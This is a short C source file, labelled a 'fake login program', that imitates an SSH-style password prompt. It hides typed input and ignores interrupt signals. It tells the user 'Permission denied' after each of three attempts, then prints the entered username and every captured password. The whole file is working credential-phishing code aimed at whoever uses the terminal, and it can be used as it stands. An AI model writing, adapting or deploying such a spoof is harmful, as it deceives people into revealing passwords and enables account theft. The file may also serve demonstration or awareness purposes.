/* login.c -- fake login program.
 * Author: Luis Colorado <luiscoloradourcola@gmail.com>
 * Date: Mon Dec 12 19:59:55 EET 2016
 * Disclaimer: (C) 2016 Luis Colorado.  All rights reserved.
 *
 * BSD 3-Clause License
 * 
 * Copyright (c) 2016, Luis Colorado All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or
 * without modification, are permitted provided that the
 * following conditions are met:
 * 
 * Redistributions of source code must retain the above
 * copyright notice, this list of conditions and the following
 * disclaimer.
 * 
 * Redistributions in binary form must reproduce the above
 * copyright notice, this list of conditions and the following
 * disclaimer in the documentation and/or other materials
 * provided with the distribution.
 * 
 * Neither the name of the copyright holder nor the names of
 * its contributors may be used to endorse or promote products
 * derived from this software without specific prior written
 * permission.
 * 
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND
 * CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES,
 * INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR
 * CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE
 * GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR
 * BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
 * LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT
 * OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 */
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <termios.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>

#define F(x) __FILE__":%d:%s: " x, __LINE__, __func__

#define FLAG_RAW        (1)
#define N_TRIES         (3)

char *username = NULL;

char *vprompt(char *buffer, size_t sz, int flags, const char *fmt, va_list args)
{
    struct termios saved_tty;
    ssize_t n_read;

    vfprintf(stderr, fmt, args);
    if (flags & FLAG_RAW) {
        struct termios tty;
        tcgetattr(0, &saved_tty);
        tty = saved_tty;
        tty.c_lflag &= ~(ECHO);
        tcsetattr(0, TCSAFLUSH, &tty);
    }

    n_read = read(0, buffer, sz-1);
    if (flags & FLAG_RAW) {
        tcsetattr(0, TCSAFLUSH, &saved_tty);
        puts(""); fflush(stdout);
    }
    if (n_read < 0) {
        return NULL;
    }

    while(n_read > 0 && buffer[n_read-1] == '\n') n_read--;
    buffer[n_read] = 0;

    return buffer;
} /* vprompt */

char *prompt(char *buffer, size_t sz, int flags, const char *fmt, ...)
{
    char *res;
    va_list args;

    va_start(args, fmt);
    res = vprompt(buffer, sz, flags, fmt, args);
    va_end(args);

    return res;
} /* prompt */

int main(int argc, char **argv)
{
    char line[1024];
    int i = 0, res;
    char *pass[10];
    char *hostname;

    res = gethostname(line, sizeof line);
    if (res < 0) {
        fprintf(stderr,
                F("gethostname: %s (errno=%d)\n"),
                strerror(errno), errno);
        exit(EXIT_FAILURE);
    }

    hostname = strdup(line);

    switch(argc) {
    case 2: username = argv[1];
    case 1: break;
    default:
        fprintf(stderr, F("Usage: login [ user ]\n"));
        exit(EXIT_FAILURE);
    }

    signal(SIGINT, SIG_IGN);
    signal(SIGQUIT, SIG_IGN);

    do {
        static char slp[] = { 0, 1, 1, 2, 3, 5, 8, 13, 21, 34, 55, };
        if (!username) {
            do {
                prompt(line, sizeof line, 0, "login: ");
                username = strdup(line);
            } while (strcmp(username, "") == 0);
        }
        prompt(line, sizeof line, FLAG_RAW, "%s@%s's password: ",
                username, hostname);
        pass[i] = strdup(line);
        sleep(slp[i]);
        fprintf(stderr, "Permission denied, please try again\n");
    } while (++i < N_TRIES);

    fprintf(stderr, "Permission denied (publickey,password)\n");
    int n = i;
    printf("Usuario: %s\n", username);
    for (i = 0; i < n; i++) {
        printf("Password#%d: %s\n", i, pass[i]);
    }
} /* main */
